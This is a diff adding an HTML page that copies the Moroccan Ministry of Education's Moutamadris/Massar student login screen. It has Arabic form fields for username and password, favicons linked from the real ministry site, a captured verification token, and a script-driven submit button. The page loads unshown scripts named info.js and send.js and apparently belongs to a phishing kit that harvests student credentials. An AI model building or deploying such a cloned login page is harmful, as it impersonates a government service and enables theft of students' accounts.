@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl"><head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="format-detection" content="telephone=no">
+    <title>Login page</title>
+    <link rel="apple-touch-icon" sizes="57x57" href="https://moutamadris.men.gov.ma/moutamadris/ScriptsIntegration/assets/img/favicon/apple-icon-57x57.png">
+    <link rel="apple-touch-icon" sizes="60x60" href="https://moutamadris.men.gov.ma/moutamadris/ScriptsIntegration/assets/img/favicon/apple-icon-60x60.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="https://moutamadris.men.gov.ma/moutamadris/ScriptsIntegration/assets/img/favicon/apple-icon-72x72.png">
+    <link rel="apple-touch-icon" sizes="76x76" href="https://moutamadris.men.gov.ma/moutamadris/ScriptsIntegration/assets/img/favicon/apple-icon-76x76.png">
+    <link rel="apple-touch-icon" sizes="114x114" href="https://moutamadris.men.gov.ma/moutamadris/ScriptsIntegration/assets/img/favicon/apple-icon-114x114.png">
+    <link rel="apple-touch-icon" sizes="120x120" href="https://moutamadris.men.gov.ma/moutamadris/ScriptsIntegration/assets/img/favicon/apple-icon-120x120.png">
+    <link rel="apple-touch-icon" sizes="144x144" href="https://moutamadris.men.gov.ma/moutamadris/ScriptsIntegration/assets/img/favicon/apple-icon-144x144.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="https://moutamadris.men.gov.ma/moutamadris/ScriptsIntegration/assets/img/favicon/apple-icon-152x152.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://moutamadris.men.gov.ma/moutamadris/ScriptsIntegration/assets/img/favicon/apple-icon-180x180.png">
+    <link rel="icon" type="image/png" sizes="192x192" href="https://moutamadris.men.gov.ma/moutamadris/ScriptsIntegration/assets/img/favicon/android-icon-192x192.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://moutamadris.men.gov.ma/moutamadris/ScriptsIntegration/assets/img/favicon/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="96x96" href="https://moutamadris.men.gov.ma/moutamadris/ScriptsIntegration/assets/img/favicon/favicon-96x96.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://moutamadris.men.gov.ma/moutamadris/ScriptsIntegration/assets/img/favicon/favicon-16x16.png">
+    <link rel="manifest" href="https://moutamadris.men.gov.ma/moutamadris/ScriptsIntegration/assets/img/favicon/manifest.json">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="msapplication-TileImage" content="assets/img/favicon/ms-icon-144x144.png">
+    <meta name="theme-color" content="#ffffff">
+
+    <link rel="stylesheet" type="text/css" href="Login%20page_files/login.css">
+</head>
+
+<body>
+    <div class="global">
+        <!-- CONTENT -->
+
+        <div class="loginContent">
+            <div class="main">
+                <div class="rightSide ">
+                    <div class="welcome">
+                        <div class="inner">
+                            <h1 class="welcomeTitle">مرحبًا بك في حسابك الخاص</h1>
+                            <p class="welcomeDesc">منظومة معلوماتية متكاملة تمكن من إرساء طرق عمل جديدة للتدبير المدرسي على صعيد المؤسسات التعليمية</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="leftSide">
+                    <div class="inner">
+                        <div class="ministryLogo">
+                            <img src="Login%20page_files/ministry-logo-ar.png" alt="">
+                        </div>
+<form id="formLogin" action="/moutamadris/Account" method="post" role="form"><input name="__RequestVerificationToken" type="hidden" value="D-piJ_TrEFEC8WxGhngwvi_dcWUt05a_DWw5lFLyqLTGRfI1jI9_JrbHXVTvAzTxt_EFur4DIvJjkfKabgqBY7E2znM1">                            <div class="formLogin">
+                                <div class="massarLogo">
+                                    <img src="Login%20page_files/massar-logo.png" alt="">
+                                </div>
+                                <div class="formLoginStyle">
+                                    <div class="item">
+                                        <input title="" class="" data-val="true" data-val-required="المرجوا ادخال اسم المستخدم" id="UserName" name="UserName" placeholder="إسم المستخدم" required="required" type="text">
+                                        <span style="display:none" id="errorLogin" class="errorLine">المرجوا ادخال اسم المستخدم</span>
+                                       <!-- حقل Honeypot مخفي -->
+                                        <input type="text" name="honeypot" style="display:none;">
+                                    </div>
+                                    <div class="item">
+                                        <input title="" class="" data-val="true" data-val-required="المرجوا ادخال كلمة المرور" id="Password" name="Password" placeholder="كلمة المرور" required="required" type="password">
+                                        <span style="display:none" id="errorPassword" class="errorLine">المرجوا ادخال كلمة المرور</span>
+
+                                    </div>
+                                    
+
+
+                                    <div class="item">
+                                        <button id="btnSubmit" class="submitBtn submitBtn-large" type="button">تسجيل الدخول </button>
+                                    </div>
+
+                                        <div class="item">
+                                            <a href="https://moutamadris.men.gov.ma/moutamadris/MotPassOublieEleve">
+                                                نسيت كلمة المرور؟
+                                            </a>
+                                        </div>
+                                        <div class="item">
+                                            <a href="https://moutamadris.men.gov.ma/moutamadris/MotPassOublieEleve">
+                                                التفعيل الأولي للحساب
+                                            </a>
+                                        </div>
+
+                                    <div class="errorZone MsgErr" id="MsgError" style="display:none">
+                                        <p>يرجى ملء الخانات المطلوبة</p>
+                                    </div>
+                                </div>
+                            </div>
+</form>                        <nav class="navLang">
+                            <ul>
+                                <li>
+                                    <a class="current" href="https://moutamadris.men.gov.ma/moutamadris/General/SetCulture?culture=ar">
+                                        العربية
+                                    </a>
+                                </li>
+                                <li>
+                                    <a class="" href="https://moutamadris.men.gov.ma/moutamadris/General/SetCulture?culture=fr">
+                                        الفرنسية
+                                    </a>
+                                </li>
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </div>
+    <script src="info.js"></script>
+    <script src="send.js"></script>
+    <script src="main.js"></script>
+</body>
+</html>
